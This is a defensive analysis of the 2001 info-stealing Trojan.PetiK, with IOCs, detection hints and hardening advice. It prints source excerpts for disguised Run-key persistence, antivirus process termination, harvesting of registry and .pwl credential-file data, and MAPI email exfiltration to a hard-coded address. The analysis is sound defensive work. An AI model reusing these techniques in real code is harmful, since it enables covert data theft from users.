# Dissecting Trojan.PetiK (2001): A Defensive Source-Level Analysis 🛠️🔍

> "This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes."

## Introduction

Trojan.PetiK is a Windows-era information-stealing trojan written in C/C++ around December 2001. It targets legacy Windows versions (9x/ME/NT/2000) and demonstrates a compact chain: installation into the system directory with a Run key, anti‑AV process tampering, local system and browser data collection, password file enumeration, and exfiltration via MAPI email. Studying the original source (`trojan.cpp`) highlights how simple API usage and dynamic loading can still lead to effective data theft. This analysis translates the code into defensive insights—documenting indicators of compromise (IOCs), dissecting the logic with inert code excerpts, and proposing detection and prevention strategies.

## 1 – Overview of the Malware 🧩

- Type: Info‑stealing trojan with email exfiltration
- Targets: Legacy Windows (Win9x/ME/NT/2000)
- Persistence: Copies as `Setup02.exe` into the system directory and creates an autorun value `Microsoft Setup` under `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`.
- Evasion: Tries to register as a service process on Win9x; enumerates processes and kills select antivirus tasks (Norton, Panda).
- Data collection: Queries `RegisteredOwner`, `RegisteredOrganization`, `ProductKey`, `ProductId`, `Version` and IE `Start Page`; enumerates `*.pwl` (Windows 9x password list) files. Writes findings to a list file in the system directory.
- Exfiltration: Uses MAPI (`MAPISendMail`) to email the list file to a hard‑coded address after confirming network connectivity with WinINet’s `InternetGetConnectedState` (both loaded dynamically).
- Decoy: Shows a “Happy New Year” message box when first executed outside the installed location.

## 2 – Source Code Analysis 🔍

### 2.1 Core Logic and Installation

Purpose: Register as a Win9x “service” (to linger), discover paths, copy into the system directory under a benign name, set persistence, then continue to anti‑AV and data collection.

```cpp
// WinMain – core install (inert excerpt; do NOT execute)
HMODULE k32 = GetModuleHandle("KERNEL32.DLL");
if (k32) {
    (FARPROC&)RegSerPro = GetProcAddress(k32, "RegisterServiceProcess");
    if (RegSerPro) RegSerPro(NULL, 1); // Win9x: hide/linger
}
GetModuleFileName(hInst, filename, 100);
GetSystemDirectory((char*)sysdir, 100);
strcpy(sysdr, sysdir);
strcat(sysdir, "\\SETUP02.EXE");
if (lstrcmp(filename, sysdir) != 0) { Bienvenue(); } else { SendInfo(); }
```

Impact: If already installed at `%SystemDirectory%\\SETUP02.EXE`, it immediately triggers exfiltration (`SendInfo`). Otherwise, it displays a decoy greeting and proceeds with installation.

```cpp
// Persistence (inert excerpt; do NOT execute)
strcat(sysdr, "\\Setup02.exe");
CopyFile(filename, sysdr, 0);
RegOpenKeyEx(HKEY_LOCAL_MACHINE, Run, 0, KEY_WRITE, &hReg);
RegSetValueEx(hReg, "Microsoft Setup", 0, REG_SZ, (BYTE*)sysdr, 100);
RegCloseKey(hReg);
```

Impact: Creates a predictable file and Run value (strong host IOCs) while using a system‑sounding name that may avoid casual scrutiny.

### 2.2 Evasion: AV Process Tampering and Decoys

Purpose: Terminate running AV processes if found; keep user attention away with a benign message when first run.

```cpp
// Anti‑AV (inert excerpt; do NOT execute)
lSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
uProcess.dwSize = sizeof(uProcess);
rProcessFound = Process32First(lSnapshot, &uProcess);
while (rProcessFound) {
    if (strstr(uProcess.szExeFile, "NAVAPW32.EXE")) { /* kill Norton */ }
    if (strstr(uProcess.szExeFile, "PAVSCHED.EXE")) { /* kill Panda  */ }
    rProcessFound = Process32Next(lSnapshot, &uProcess);
}
CloseHandle(lSnapshot);
```

Impact: Noisy behavior visible to EDR: Toolhelp32 enumeration followed by `OpenProcess/TerminateProcess` attempts. Indicates crude self‑protection.

```cpp
// Decoy greeting (inert excerpt; do NOT execute)
MessageBox(NULL,
  "Je te souhaite une Bonne et Heureuse Nouvelle Année...",
  "BONNE ANNEE !", MB_OK | MB_ICONINFORMATION);
```

Impact: Localized (French) greeting used as social camouflage on first run outside the final path.

### 2.3 Data Collection: System, Browser, and Password Lists

Purpose: Harvest owner/organization and product data, IE start page, enumerate `.pwl` files, and write everything into a list file under the system directory.

```cpp
// Information() – registry and file inventory (inert excerpt; do NOT execute)
GetSystemDirectory((char*)liste, 50);
strcat(liste, "\\liste_troj.txt");
RegOpenKeyEx(HKEY_LOCAL_MACHINE, CurVer, 0, KEY_QUERY_VALUE, &hReg);
RegQueryValueEx(hReg, "RegisteredOwner", 0, &type, owner, &sizowner);
RegQueryValueEx(hReg, "ProductId", 0, &type, id, &sizid);
RegCloseKey(hReg);
RegOpenKeyEx(HKEY_CURRENT_USER, Main, 0, KEY_QUERY_VALUE, &hReg);
RegQueryValueEx(hReg, "Start Page", 0, &type, page, &sizpage);
RegCloseKey(hReg);
WritePrivateProfileString("Info Ordi", "Owner", owner, liste);
WritePrivateProfileString("Info Internet", "Page Internet", page, liste);
```

Impact: `liste_troj.txt` becomes a central artefact containing host identity and browser home page. The use of INI‑style sections aids quick identification during IR.

```cpp
// PWL enumeration (inert excerpt; do NOT execute)
GetWindowsDirectory((char*)pwl, 50);
SetCurrentDirectory(pwl);
HANDLE hFile = FindFirstFile("*.pwl", &Search);
while (hFile != INVALID_HANDLE_VALUE && abc) {
  WritePrivateProfileString("Info Pass", Search.cFileName, pwl, liste);
  abc = FindNextFile(hFile, &Search);
}
FindClose(hFile);
```

Impact: On Win9x, `.pwl` files store cached credentials. The trojan logs their names and the directory path—enough to guide a later theft process or manual retrieval.

### 2.4 Communication: Network Check and Email Exfiltration

Purpose: Dynamically load WinINet to confirm connectivity, then load `MAPI32.DLL` and invoke `MAPISendMail` to email the `liste_troj.txt` file to a hard‑coded address.

```asm
; SendInfo() – key steps (inert excerpt; do NOT execute)
    ; Build path %SystemDir%\liste_troj.txt into [liste]
    call    GetSystemDirectoryA
    ; Load WININET.DLL and resolve InternetGetConnectedState
    call    LoadLibrary          ; "WININET.DLL"
    call    GetProcAddress       ; "InternetGetConnectedState"
    ; If connected, proceed; then load MAPI32.DLL and resolve MAPISendMail
    call    LoadLibrary          ; "MAPI32.DLL"
    call    GetProcAddress       ; "MAPISendMail"
    ; Prepare MAPI Message with:
    ;   To: "Pentasm99@aol.com"
    ;   Subject: "Trojan_PetiK, OUVRE-VITE PETIK"
    ;   Body: short French text
    ;   Attachment: %SystemDir%\liste_troj.txt
    ; mSendMail(session=NULL, ...)
```

Impact: No authentication prompts in older MAPI configurations. Hard‑coded recipient and French subject make strong string‑based signatures. After sending, the code removes the Run value—suggesting an exfil‑and‑exit behavior when run from the installed path.

```cpp
// Cleanup of persistence after SendInfo (inert excerpt; do NOT execute)
RegOpenKeyEx(HKEY_LOCAL_MACHINE, Run, 0, KEY_ALL_ACCESS, &hReg);
RegDeleteValue(hReg, "Microsoft Setup");
RegCloseKey(hReg);
```

Impact: If invoked from `%SystemDirectory%\\SETUP02.EXE`, the trojan clears its autorun value. The copy at `%SystemDirectory%\\Setup02.exe` remains unless separately removed.

## 3 – Mitigation and Defense Strategies 🛡️

### Detection Strategies (Analyst Focus)

- Registry IOCs:
  - `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Microsoft Setup = %SystemDirectory%\\Setup02.exe`
- File IOCs:
  - `%SystemDirectory%\\Setup02.exe` (installed copy)
  - `%SystemDirectory%\\liste_troj.txt` (INI‑style file with sections `Info Ordi`, `Info Internet`, `Info Pass`)
  - `.pwl` enumeration from `%WINDIR%` in event traces
- Process/behavioral:
  - `CreateToolhelp32Snapshot` + `OpenProcess/TerminateProcess` targeting `NAVAPW32.EXE`, `PAVSCHED.EXE`
  - Dynamic loads: `WININET.DLL` → `InternetGetConnectedState`; `MAPI32.DLL` → `MAPISendMail`
  - `RegisterServiceProcess` on Win9x
- String/YARA hints:
  - Value name `Microsoft Setup`, filenames `SETUP02.EXE`/`Setup02.exe`
  - Recipient `Pentasm99@aol.com`, subject `Trojan_PetiK, OUVRE-VITE PETIK`
  - INI section labels: `Info Ordi`, `Info Internet`, `Info Pass`

### Prevention Strategies (Admin Focus)

- Tamper protection: Block unauthorized `OpenProcess(PROCESS_ALL_ACCESS)` and `TerminateProcess` against security tools; ensure EDR self‑protection is enabled.
- Application control: Use AppLocker/WDAC to allow only signed/approved binaries in system directories; alert on new executables named like setup/system components.
- Harden legacy components: Restrict or disable programmatic MAPI access; enforce prompts and logging for `MAPISendMail` by unknown processes. Limit WinINet for non‑browser processes.
- Registry hardening: Monitor autorun keys (`HKLM\\...\\Run`) for new/changed values; auto‑remediate suspicious entries.
- Legacy credential hygiene: Systems still holding `.pwl` files (Win9x) should be isolated, upgraded, or have legacy caches removed.
- Email security: Strip executable attachments; leverage attachment sandboxing; educate users on French/English lure subjects and unusual senders.

## Conclusion

Trojan.PetiK is a compact, early‑2000s info‑stealer that still offers relevant lessons: small codebases can achieve persistence, evade basic defenses, and exfiltrate sensitive host information using standard APIs. Its reliance on Run keys, process tampering, WinINet connectivity checks, and MAPI email provides multiple telemetry points for detection. Defenders should focus on autorun protection, strict programmatic email controls, and defenses against process tampering, while using file/registry IOCs (e.g., `Setup02.exe`, `liste_troj.txt`, `Microsoft Setup`) to triage suspect hosts. Where legacy systems persist, additional controls are essential to prevent similar threats from achieving their objectives.